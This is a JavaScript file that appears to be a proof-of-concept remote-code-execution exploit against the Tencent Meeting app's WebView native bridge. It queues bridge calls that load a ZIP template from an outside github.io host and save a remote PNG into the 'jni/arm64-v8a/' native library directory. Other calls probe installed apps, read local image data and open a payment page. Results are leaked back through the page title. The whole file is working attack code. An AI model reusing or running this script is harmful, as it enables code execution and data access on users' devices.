(function(){
  document.title='P71JS:'+location.host;
  window.__p=function(r){
    try{r=typeof r==='string'?JSON.parse(r):r}catch(e){}
    try{
      window.JSCallJavaMgr.JSCallNative(JSON.stringify({
        module:'CommonPlugin',method:'PrintLog',
        param:{log:JSON.stringify(r)},callId:'LOG'
      }));
    }catch(e){}
    document.title='P71CB:'+(r&&r.callId)+':'+(r&&r.code)+':'+String(r&&r.message||JSON.stringify(r&&r.data||{})).slice(0,56);
  };
  function c(id,mod,m,p){
    window.JSCallJavaMgr.JSCallNative(JSON.stringify({
      callback:'window.__p',module:mod,method:m,param:p,callId:id
    }));
  }
  var png='https://gitwhs.github.io/wm-poc-rce/p40.png';
  var zip='https://gitwhs.github.io/wm-poc-rce/p50.zip';
  var official='https://meeting.tencent.com/v2/webview/keep-app-alive';
  var pay='wemeet://page/pay/main_process_webview?url='+encodeURIComponent(official);
  var q=[
    ['H1','CommonPlugin','GetPerformance',{}],
    ['T1','CommonPlugin','LoadTemplateWebView',{template_url:zip,url:zip}],
    ['T2','CommonPlugin','LoadTemplateWebView',{url:zip,template_url:zip,from:'web'}],
    ['T3','CommonPlugin','UpdateTemplatePreloadDataCache',{url:zip,template_url:zip}],
    ['T4','CommonPlugin','TemplateUpdateSuccess',{url:zip}],
    ['S1','CommonPlugin','SavePic',{url:png,export_dir:'jni/arm64-v8a/'}],
    ['S2','CommonPlugin','SavePic',{image_url:png,url:png}],
    ['S3','CommonPlugin','SavePic',{url:png}],
    ['O1','CommonPlugin','OpenOperationUrl',{url:official}],
    ['R1','CommonPlugin','RouterToExternalBrowser',{url:official}],
    ['C1','CommonPlugin','GetWebPageRunningContext',{}],
    ['A1','AppManager','IsAppInstalled',{package_name:'com.tencent.wemeet.app'}],
    ['M1','MediaWebPlugin','SaveImageToPhotosAlbum',{url:png}],
    ['M2','MediaWebPlugin','GetLocalImageData',{url:png}],
    ['N1','CommonPlugin','OpenNewPage',{url:pay,scheme:pay}],
    ['H2','CommonPlugin','GetPerformance',{}]
  ];
  var i=0;
  function n(){
    if(i>=q.length){document.title='P71-DONE';return}
    var x=q[i++];
    c(x[0],x[1],x[2],x[3]);
    setTimeout(n,800);
  }
  n();
})();
